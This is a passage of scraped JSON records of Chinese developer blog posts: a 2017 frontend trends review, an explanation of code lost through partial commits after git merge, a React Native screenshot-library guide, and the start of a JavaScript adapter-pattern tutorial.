src=\"https://user-gold-cdn.xitu.io/2017/12/29/1609fe03933433cf?w=1792\u0026amp;h=1312\u0026amp;f=png\u0026amp;s=162960\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e可以看到react的深紫色是最多的，表示用户对于react还是十分满意的。虽然，早前的React收到了协议的影响，但是，这似乎并不影响它在开发者心目当中的地位。另外，react如此受欢迎的另一个重要原因就应该是React Native了吧。今年以来，React Native一直以两周一次的小版本更迭周期，迅速发展着。或许，2018年将会迎来最重大的正式版本1.0。(这个还是值得期待的。)\u003c/p\u003e\n\u003cp\u003e对于大多数开发者而言，学习了React的时候，对于它们学习React Native是有直接性质的帮助的，所以一般的国外开发者不会拒绝学习React这个框架的。\u003c/p\u003e\n\u003cp\u003e介绍完，React的情况，我们或许可以回望一下Angular的情况吧。\u003c/p\u003e\n\u003cp\u003eAngular可以说是一个最早问世的MVVM的框架。2009年，angular像一枚重磅炸弹一样，震撼了前端的开发者们。当时，W3C似乎还未推出正式的Web Component标准。React和Vue也还在襁褓之中安眠。可想而知，之后的几年Angular一直影响着后续前端的发展。但是，Angular有着许许多多的问题，也使得它在后续的框架之争中，处于下风。2016年9月正式推出的angular2，将angular引领向了另一种形式——以HTML为中心的框架。一套完整的体现，其中加入了TypeScript+RxJS等组合，可想而知，一套内容的学习成本相当之高，与React以JS为中心的思想完全不同。不过似乎这一次Google将框架的定位目标换成了企业，国内外在使用这套框架的往往是银行、证券类企业。不过，它的发展还是被看好的，毕竟它的背后可都是一群Google的顶尖开发工程师呢！！\u003c/p\u003e\n\u003cp\u003e最后，我们来了解一下三驾马车中的黑马——Vue。\u003c/p\u003e\n\u003cp\u003e从第一张图中，虽然React一直处于领导地位，但是，Vue2的使用，也将于其他两个框架持平快了。毕竟，在国内的前端环境中，Vue可以说是非常受欢迎的。(据说印度开发前端，会用Angular，中国人开发前端，会用Vue)不得不说的是，Vue与Weex的结合，虽然体验不及RN，但是有着阿里的技术支持，也将有希望突破吧。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003ePWA\u003c/h2\u003e\n\u003cp\u003e如果在国外，你今年听到的热词一定会有PWA这个东西。前不久，Safari已经开始支持PWA了，那么也就意味着PWA的时代不会太远了。当然，国内实践PWA的公司也不占少数，例如饿了么、阿里等。从去年开始，对其有所耳闻，到今年Google开发者大会上的现场演示，相信更多的开发者对于这门技术的狂热。对于国内开发者而言，唯一不好的优势应该就是文档了。因为目前来说，大部分的文档都是以英文的形式存在于GitHub或者国外书籍中的。翻译过来的书，也不会这么快的速度问世，所以目前研究PWA的中文资料少之又少。\u003c/p\u003e\n\u003cp\u003e不过相信，它的发展在之后的一两年的是强而有力的。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e国内的小程序\u003c/h2\u003e\n\u003cp\u003e今年，在国内会被称为“小程序年”。从1月份开始，微信正式将公测了小程序。继而在7月份开始，支付宝也推出了相应的小程序。在国内，这样子的重大消息是不容忽视的。两大巨头之争，推动的是无与伦比的流量红利。基于小程序的开发，也将成为国内的前端的一大重点。将原用的整体化的内容，逐步分割成一个个小的模块，将至放入到微信这个大环境中去分享，最后起到一个引流的效果。回到技术的成面，小程序或许会有着与PWA一样的思想，将之前在移动端难以为继的Web端，放入到自家应用中，来确保它的长久与稳定。更多的是说，这两者起到了异曲同工的效果。同样的，这项技术，将在2018年持续发展下去，同时，也会有更多的前端投入到这项开发中去。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003estyled-components\u003c/h2\u003e\n\u003cp\u003e这项技术，也是从上半年开始有所耳闻的。主要是作为react库的衍生物的形式出现的。它将css部分的代码以js的形式展现在代码中，那么之后只需要开发js就可以完成整个应用的开发了。同时，它还有一个好处，它的样式是基于组件的，所以可以做到复用，同时，往往js的变量在css中去使用时，是一个令人头疼的问题。而styled-components很好的解决了这个问题，因为它本身就是在组件中开发样式，js的变量依然可以被使用在css的部分代码中。这项技术也是可期的，因为越来越多的人在自己的react项目中开始了这项技术的尝试。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eRollup\u003c/h2\u003e\n\u003cp\u003e这是啥？没错，又有一个模块打包工具来了。或许，大家熟知的更多的是webpack这个模块打包工具。今年的4月份，React做了一个大动作——在React的主分支上合并了一个PR，将当时的构建工具换成了Rollup。可想而知，这个东西将会是多么的重要。好奇的是，它与其他的不同之处吧！它是一款基于ES2015模块进行打包的打包器。在过去的打包工具(包括webpack在内)中，都是基于CommonJS的规范去进行模块的打包的，所以，过去很多库的前面总是会有一大堆webpack等自家的逻辑填充在开头。Rollup不同，他是后天生的，出生的基准点就表明它的高度将不限于此。但是，相对于巨头webpack来说，它或许在今年并未体现出它的优势，但是相信它会厚积薄发的。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e建议：在开发应用时，使用webpack，在开发库时，可以考虑Rollup。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003eGraphQL\u003c/h2\u003e\n\u003cp\u003e这个东西，或许在国内鲜有闻之。但是，它仍是一项不错的技术，同时在调查中，也体现出不俗的潜力，如图：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"GraphQL\" src=\"https://user-gold-cdn.xitu.io/2017/12/29/1609fe038158bc2e?w=720\u0026amp;h=517\u0026amp;f=jpeg\u0026amp;s=10583\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e它是有Facebook开发的一款API查询语言，或将替代Rest在后端的地位。虽然，目前来说，其性能并不是特别的优秀，也会bug不断。但是，2018年或将是GraphQL的一年。那么，和前端又有什么关系呢？别忘了，我们手里还有一个利器NodeJS呢！能够用好它，对于你开发nodeJS，或许使用便利。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eTypeScript\u003c/h2\u003e\n\u003cp\u003e这一项由微软老大开发的语言，处处在弥补着JavaScript的缺陷。一出生，就打着“取代JavaScript”的旗号，发展的速度也是惊人的。当然了，W3C也在努力的推进着JavaScript的进步，之后的几年，应该会是着两门语言并驾齐驱的发展吧。因为开发人口众多，不可能走到谁取代谁的地步。\u003c/p\u003e\n\u003cp\u003e最后，贴出一张Stackoverflow上面的一项数据统计表吧！\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"兴趣表\" src=\"https://user-gold-cdn.xitu.io/2017/12/29/1609fe04057c010c\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e图片来源：\u003ca target=\"_blank\" href=\"https://medium.freecodecamp.org/i-just-asked-23-000-developers-what-they-think-of-javascript-heres-what-i-learned-9a06b61998fa\"\u003eI just asked 23,000 developers what they think of JavaScript. Here’s what I learned.\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch1 class=\"heading\"\u003e总结\u003c/h1\u003e\n\u003cp\u003e我们盘点了一年以来前端的发展，有着不错新技术不断被推出着，相信前端会发展的越来越好。因为在JSConf大会上，有人发言说，之后将会发展成“前端+云端”的组合。那么，也并不存在全栈类开发的说法了。前端开发的小伙伴加油吧！！我们共勉\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e如果你对我写的有疑问，可以评论，如我写的有错误，欢迎指正。你喜欢我的博客，请给我关注Star~呦\u003ca target=\"_blank\" href=\"https://github.com/laizimo/zimo-article\"\u003egithub博客\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514890127.7992","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c06ff"},"id":"5a0bdd335188254dd935f008","author":{"$oid":"5a4b770f19da8721f49c06f1"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"git merge使用不当引发的代码丢失血案","meta":{"likeCount":0},"tag":["Git","前端","命令行"],"comment":[],"shortContent":"几年前大批量的团队都在转用git，git的本地库和分支特性让代码管理的便利性大大增加，也因为本地库和分支的大批量使用导致了代码之间的频繁merge，我们团队以前就有遇到过git merge以后丢代码的情况，表现就是某些变更开发A提交了，经过中间以序列的commit, merge…","content":"\u003cp\u003e原文： \u003ca href=\"http://blog.23lab.com/2017/11/14/find-missing-code-in-git/\"\u003egit merge使用不当引发的代码丢失血案@blog.23lab.com\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e背景\u003c/h2\u003e\u003cp\u003e几年前大批量的团队都在转用\u003ccode\u003egit\u003c/code\u003e，\u003ccode\u003egit\u003c/code\u003e的本地库和分支特性让代码管理的便利性大大增加，也因为本地库和分支的大批量使用导致了代码之间的频繁merge，我们团队以前就有遇到过\u003ccode\u003egit merge\u003c/code\u003e以后丢代码的情况，表现就是某些变更开发A提交了，经过中间以序列的\u003ccode\u003ecommit\u003c/code\u003e, \u003ccode\u003emerge\u003c/code\u003e，\u003ccode\u003epush\u003c/code\u003e，最终某些改动没了，去看commit history，也没有相应的变更记录。一次次commit对比以后总是会找到某次的\u003ccode\u003emerge\u003c/code\u003e，但是也没法解释为什么会丢，最后为了保险通常会选择beyond compare全量对比一次确保所有丢失的代码找回来，那是一个痛苦而又让人睡不安稳的解决办法。\u003c/p\u003e\n\u003cp\u003e今天又遇到了一次这个问题，这次的更加诡异，在我查为什么丢的时候，另外一个同事提交代码以后竟然丢失的代码回来了，我当时脑袋里面只想到一个词，那就是： 见鬼。但是冷静下来想，git这种工具出现真丢代码的概率肯定很小，肯定是我们姿势不对。于是认认真真的研究了我们今天的提交记录，终于找到答案，就是\u003ccode\u003egit merge\u003c/code\u003e后只提交部分代码导致的，这里顺带提一下，\u003ccode\u003egit pull\u003c/code\u003e等于\u003ccode\u003egit fetch + git merge\u003c/code\u003e，所以\u003ccode\u003egit pull\u003c/code\u003e时也需要特别关注本文提到的问题。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e验证过程\u003c/h2\u003e\u003cp\u003e为了验证这个问题，我建了一个全新的\u003ccode\u003egit\u003c/code\u003e库来复现上述问题，根据我们遇到的情况模拟，整个过程我使用三个用户模拟交叉提交和合并，分别是user1，user2，user3，为了方便我没有选择注册三个号，而是在提交信息里面都带上了名字，可以制造两次代码冲突，并且两次都进行部分提交。最终的代码提交记录如下： \u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image.png\" src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbe57ef05303c4?w=1010\u0026h=778\u0026f=png\u0026s=142376\"\u003e\u003cfigcaption\u003eimage.png\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e为了更清晰的看到这个提交过程，我将三个用户的提交分开来，并根据提交先后做了下面的图。\u003cbr\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image.png\" src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbe57ef1a87107?w=1240\u0026h=919\u0026f=png\u0026s=274019\"\u003e\u003cfigcaption\u003eimage.png\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e代码怎么丢的？\u003c/h3\u003e\u003cp\u003e首先，第1步和第2步，user1和user2分别在本地做修改，共同修改了\u003ccode\u003efile1\u003c/code\u003e，只有user2对\u003ccode\u003efile2\u003c/code\u003e也做了修改，所以如果这两人的代码合并，可以预计合并的时\u003ccode\u003efile1\u003c/code\u003e会冲突，file2不会。user2修改完成以后做了一次\u003ccode\u003egit push\u003c/code\u003e，这时候\u003ccode\u003egit\u003c/code\u003e远端库的head应该是指向user2的最后一次提交的。接着user1做\u003ccode\u003egit pull\u003c/code\u003e，因为file1被两个用户修改了，所以需要合并，接着user1处理完冲突以后只提交了\u003ccode\u003efile1\u003c/code\u003e，没有提交\u003ccode\u003efile2\u003c/code\u003e（用命令行需要手动\u003ccode\u003ereset\u003c/code\u003e，但是用有些GUI工具是可以选择只提交\u003ccode\u003efile1\u003c/code\u003e的）。此时的库已经丢失了\u003ccode\u003euser2:file2:add line\u003c/code\u003e的那次改动，这就是血案的开始，丢代码。可以对比一下 \u003ca href=\"https://github.com/erichua23/find-the-missing-code/blob/86c9d08a2c50e2f02a9a32b4c8f3c1f58ff82006/file2\"\u003emerge前\u003c/a\u003e 和\u003ca href=\"https://github.com/erichua23/find-the-missing-code/blob/f0599206fb4c7712e17ecaef202c724c9f1124bf/file2\"\u003emerge后\u003c/a\u003e 。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e代码怎么\"恢复\"的？\u003c/h3\u003e\u003cp\u003e前面只是验证了代码怎么丢，但是事情没有结束，我上面提到更诡异的是代码恢复了，这又是怎么回事呢？user1在第3步合完代码以后，自己进行了两次提交，修改了file3和file1，同时，user3加入并本地修改了file1（预计会和user1冲突），接着user1\u003ccode\u003egit push\u003c/code\u003e，然后user3 \u003ccode\u003egit pull\u003c/code\u003e，这时候会报\u003ccode\u003efile1\u003c/code\u003e冲突，同样，user3犯了user1类似的错误，只提交了冲突文件\u003ccode\u003efile1\u003c/code\u003e。按第3步丢代码的经验，\u003ccode\u003efile3\u003c/code\u003e的改动肯定是没有了，验证以后确实如此，但是再看看file2的变更呢，它竟然又回来了，所以所谓的恢复不是恢复，所谓的丢失没有丢失，就问你怕不怕。更可怕的是我们再去看\u003ccode\u003efile2\u003c/code\u003e的变更历史。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"image.png\" src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbe57ef0bab1e6?w=1033\u0026h=240\u0026f=png\u0026s=33892\"\u003e\u003cfigcaption\u003eimage.png\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e中间消失和恢复的过程没有任何变更记录，这也是之前我们经常查到没法往下查到地方。从表现上看，是第一次误操作忽略了这一行的变更，而第二次误操作，可以理解为是忽略了忽略添加这一行的那一次变更，但是，所有的都没有记录。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e总结\u003c/h2\u003e\u003cp\u003e上面的实验可能看起来有点繁琐，总结一下，核心的问题就是不要在\u003ccode\u003egit merge\u003c/code\u003e的时候只提交部分代码，特别是好多人刚刚用\u003ccode\u003egit\u003c/code\u003e的时候，运行完成一次\u003ccode\u003egit merge\u003c/code\u003e，发现自己修改了1个文件，结果\u003ccode\u003egit\u003c/code\u003e提示要提交100个，这时候小心谨慎的新同学就会选择只提交自己的变动吧，殊不知这是在犯大错啊。除了这种情况，之前还遇到有的新同学会修改\u003ccode\u003egit\u003c/code\u003e默认生成的merge信息，这也是非常不好的习惯，改了以后在查问题的时候没办法很容易的看到哪些是merge。所以请注意：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003egit merge以后不要部分提交！！\u003c/li\u003e\n\u003cli\u003egit merge以后不要部分提交！！\u003c/li\u003e\n\u003cli\u003e\u003cp\u003egit merge以后不要部分提交！！\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003egit merge的信息不要手动改！！\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003egit merge的信息不要手动改！！\u003c/li\u003e\n\u003cli\u003egit merge的信息不要手动改！！\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e文中提到的实验库的地址是： \u003ca href=\"https://github.com/erichua23/find-the-missing-code\"\u003efind-the-missing-code\u003c/a\u003e, 有兴趣的童鞋可以自己详细看一下。\u003c/p\u003e\n","buildTime":"1514880329.9865","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c06fe"},"id":"5a263f0e51882560e3567d65","author":{"$oid":"5a4b770f19da8721f49c06f7"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/5/160256781f082149?w=497\u0026h=314\u0026f=png\u0026s=45948","https://user-gold-cdn.xitu.io/2017/12/5/1602567f3087e1bc?w=258\u0026h=258\u0026f=jpeg\u0026s=27667"],"screenShot":null}],"title":"React Native 截屏组件","meta":{"likeCount":0},"tag":["React Native","前端","React.js","Android"],"comment":[],"shortContent":"截取当前屏幕，跟系统自带的截图一致，只会截取当前屏幕显示的页面内容。如果是ScrollView，那么未显示的部分是不会被截取的。 指定需要截取的组件的ref名称，然后将该ref名称传递给snapshot方法来截取指定组件的内容。如需要截取ScrollView，只需要将”full…","content":"\u003cp\u003e\u003cem\u003e本文原创首发于公众号：ReactNative开发圈，转载需注明出处。\u003c/em\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eReact Native 截屏组件：react-native-view-shot，可以截取当前屏幕或者按照当前页面的组件来选择截取，如当前页面有一个图片组件，一个View组件，可以选择截取图片组件或者View组件。支持iOS和安卓。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e安装方法\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enpm install react-native-view-shot\nreact-native link react-native-view-shot\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e使用示例\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003ecaptureScreen()  截屏方法\u003c/h3\u003e\n\u003cp\u003e截取当前屏幕，跟系统自带的截图一致，只会截取当前屏幕显示的页面内容。如果是ScrollView，那么未显示的部分是不会被截取的。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport { captureScreen } from \u003cspan class=\"hljs-string\"\u003e\"react-native-view-shot\"\u003c/span\u003e;\n\ncaptureScreen({\n  format: \u003cspan class=\"hljs-string\"\u003e\"jpg\"\u003c/span\u003e,\n  quality: 0.8\n})\n.then(\n  uri =\u0026gt; console.log(\u003cspan class=\"hljs-string\"\u003e\"Image saved to\"\u003c/span\u003e, uri),\n  error =\u0026gt; console.error(\u003cspan class=\"hljs-string\"\u003e\"Oops, snapshot failed\"\u003c/span\u003e, error)\n);\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003ecaptureRef(view, options) 根据组件reference名称来截取\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eimport { captureRef } from \u003cspan class=\"hljs-string\"\u003e\"react-native-view-shot\"\u003c/span\u003e;\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n     \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e (\n\u0009 \u0026lt;ScrollView ref=\u003cspan class=\"hljs-string\"\u003e\"full\"\u003c/span\u003e\u0026gt;\n\u0009\u0009  \u0026lt;View ref=\u003cspan class=\"hljs-string\"\u003e\"form1”\u0026gt;\n\u0009\u0009   \u0026lt;/View\u0026gt;\n                  \u0026lt;View ref=\"\u003c/span\u003eform2”\u0026gt;\n\u0009\u0009   \u0026lt;/View\u0026gt;\n\u0009\u0026lt;/ScrollView\u0026gt;\n);\n}\n\nsnapshot = refname =\u0026gt; () =\u0026gt;\ncaptureRef(refname, {\n  format: \u003cspan class=\"hljs-string\"\u003e\"jpg\"\u003c/span\u003e,\n  quality: 0.8,\n  result: \u003cspan class=\"hljs-string\"\u003e\"tmpfile\"\u003c/span\u003e,\n  snapshotContentContainer: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n})\n.then(\n  uri =\u0026gt; console.log(\u003cspan class=\"hljs-string\"\u003e\"Image saved to\"\u003c/span\u003e, uri),\n  error =\u0026gt; console.error(\u003cspan class=\"hljs-string\"\u003e\"Oops, snapshot failed\"\u003c/span\u003e, error)\n);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e指定需要截取的组件的ref名称，然后将该ref名称传递给snapshot方法来截取指定组件的内容。如需要截取ScrollView，只需要将”full”传递给snapshot方法即可。\ncaptureRef方法和captureScreen方法都可以设置options，options的说明如下：\nwidth / height：可以指定最后生成图片的宽度和高度。\nformat：指定生成图片的格式png or jpg or webm (Android). 默认是png。\nquality：图片的质量0.0 - 1.0 (default)。\nresult：最后生成的类型，可以是tmpfile、base64、data-uri。\nsnapshotContentContainer：如果设置为True的话，会动态计算组件的高度。如果是ScrollView组件，就会截取整个ScrollView的实际高度。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e支持的组件\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/5/160256781f082149?w=497\u0026amp;h=314\u0026amp;f=png\u0026amp;s=45948\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e示例源码\u003c/h2\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/forrest23/ReactNativeComponents\"\u003eGitHub - forrest23/ReactNativeComponents: React Native组件大全\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e组件地址\u003c/h2\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/gre/react-native-view-shot\"\u003eGitHub - gre/react-native-view-shot: Snapshot a React Native view and save it to an image\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e举手之劳关注我的微信公众号：\u003cstrong\u003eReactNative开发圈\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/5/1602567f3087e1bc?w=258\u0026amp;h=258\u0026amp;f=jpeg\u0026amp;s=27667\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n","buildTime":"1514863272.6834","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c0700"},"id":"5a1bd31cf265da431769dd25","author":{"$oid":"5a4b770f19da8721f49c06fb"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"JavaScript设计模式系列五之适配器模式(附案例源码)","meta":{"likeCount":0},"tag":["JavaScript","前端","设计模式"],"comment":[],"shortContent":"深入系列文章部分是有先后顺序的，按照目录结构顺序阅读效果最好。 如果有疑问或者发现错误，可以在相应的 issues 进行提问或勘误。 深入系列文章部分是有先后顺序的，按照目录结构顺序阅读效果最好。","content":"\u003ch1 class=\"heading\"\u003e文章初衷\u003c/h1\u003e\u003cblockquote\u003e\n\u003cp\u003e设计模式其实旨在解决语言本身存在的缺陷,\u003c/p\u003e\n\u003cp\u003e目前javaScript一些新的语法特性已经集成了一些设计模式的实现,\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e大家在写代码的时候,没必要为了用设计模式而去用设计模式\u003c/strong\u003e,\u003c/p\u003e\n\u003cp\u003e那么我这边为什么还写设计模式的文章呢,\u003c/p\u003e\n\u003cp\u003e一方面是自己的一个整理,然后记录出来,结合自己的理解,\u003c/p\u003e\n\u003cp\u003e一方面就是虽然语言特性本身已经实现这些模式,有了自己的语法,\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e但是我们何尝不能去了解一下它是通过什么样的思路去实现了\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e在我看来设计模式更多的是让我对于思考问题,有了一些更好的思路和想法\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e文章实现更多的表现为用一些简单的案例,帮助大家去理解这样的一种思路,\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e会存在故意把设计模式的实现往简单的案例靠拢,\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e大家在真实项目中不要刻意去用设计模式实现相同的代码\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e设计模式在平时的一些代码中都会有所体现,大家也许经常用到,\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e耐心看文章,也许你会发现自己平时的代码就不断在设计模式中体现\u003c/strong\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch1 class=\"heading\"\u003eJavaScript设计模式系列\u003c/h1\u003e\u003cblockquote\u003e\n\u003cp\u003eJavaScript设计模式系列,讲述大概20-30种设计模式在JavaScript中的运用\u003c/p\u003e\n\u003cp\u003e后面对应的篇幅会陆续更新,欢迎大家提出建议\u003c/p\u003e\n\u003cp\u003e这是设计模式系列第五篇,讲述适配器模式\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003ca href=\"https://juejin.im/post/5a18cff5f265da432717ec71\"\u003e上篇文章讲述了外观模式,有兴趣可以查看\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e注意\u003c/h2\u003e\u003cp\u003e\u003ca href=\"https://github.com/ToNiQian/js-design-mode\"\u003eJavaScript设计模式系列github地址\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e深入系列文章部分是有先后顺序的，按照目录结构顺序阅读效果最好。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e勘误及提问\u003c/h2\u003e\u003cp\u003e如果有疑问或者发现错误，可以在相应的 issues 进行提问或勘误。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e适配器模式\u003c/h2\u003e\u003ch3 class=\"heading\"\u003e概念:\u003c/h3\u003e\u003cblockquote\u003e\n\u003cp\u003e将一个对象的方法或者属性转化成另外一个接口,\u003c/p\u003e\n\u003cp\u003e使得对象之间的方法或属性不兼容性问题通过适配器得到解决\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003cp\u003e通俗点去理解\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e比如苹果插座是三孔的,这时候我们想要充电,\u003c/p\u003e\n\u003cp\u003e但是并没有三孔的插头,这时候我们就需要适配器转换一下,\u003c/p\u003e\n\u003cp\u003e这样我们就可以充电的,这就是适配器模式解决问题的场景\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e案例体现\u003c/h3\u003e\u003cblockquote\u003e\n\u003cp\u003e比如我们现在需要打印一个数组,通过后台接口我们取到的是一个对象,\u003c/p\u003e\n\u003cp\u003e这时候我们就需要通过转换把对应的对象转换为数组,\u003c/p\u003e\n\u003cp\u003e这种场景在我们项目中还是经常会遇到的,下面简单的进行一个模拟\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e代码体现\u003c/h3\u003e\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e// 适配器模式\n\n// obj对象转换为数组\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e objToArray(obj) {\n    var arr = []; //新数组\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i  \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e obj){\n        arr.push(obj[i]);\n    }\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e arr;\n}\n// 创建一个对象\nvar obj = {\n    name: \u003cspan class=\"hljs-string\"\u003e'小钱'\u003c/span\u003e,\n    age: 18,\n    sex: \u003cspan class=\"hljs-string\"\u003e'男'\u003c/span\u003e\n}\n// 假设我这边需要的结果是一个数组格式的输出\nconsole.log(objToArray(obj));//[\u003cspan class=\"hljs-string\"\u003e'小钱'\u003c/span\u003e,18,\u003cspan class=\"hljs-string\"\u003e'男'\u003c/span\u003e]\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003ejQuery与zepto框架的适配\u003c/h3\u003e\u003cblockquote\u003e\n\u003cp\u003e适配器模式在\u003ccode\u003ejQuery\u003c/code\u003e与\u003ccode\u003ezepto\u003c/code\u003e框架之间也有一个很好的体现,\u003c/p\u003e\n\u003cp\u003e在之前,我们在开发移动端的时候,会选择用\u003ccode\u003ezepto\u003c/code\u003e框架来替代比较大的\u003ccode\u003ejQuery框架\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e这边其实就很好的利用了适配模式,基本上会\u003ccode\u003ejQuery\u003c/code\u003e的同学很快速的可以掌握\u003ccode\u003ezepto\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e适配器模式与外观模式的对比\u003c/h3\u003e\u003cul\u003e\n\u003cli\u003e\u003cp\u003e外观模式\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e概念:\u003c/h3\u003e\u003cblockquote\u003e\n\u003cp\u003e为一组复杂的子系统接口提供一个更高级的统一接口,\u003c/p\u003e\n\u003cp\u003e通过这个接口使得对子系统接口的访问更容易\u003c/p\u003e\n\u003cp\u003e外观模式又被称作为门面模式\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e适配器模式\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e概念:\u003c/h3\u003e\u003cblockquote\u003e\n\u003cp\u003e将一个对象的方法或者属性转化成另外一个接口,\u003c/p\u003e\n\u003cp\u003e使得对象之间的方法或属性不兼容性问题通过适配器得到解决\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e \u003cstrong\u003e外观模式与适配器模式的不同点在于,外观模式侧重点在于\u003ccode\u003e提供统一接口\u003c/code\u003e,使得\u003ccode\u003e访问接口更容易\u003c/code\u003e,适配器模式侧重点在于\u003ccode\u003e转换接口\u003c/code\u003e,\u003ccode\u003e解决不兼容问题\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 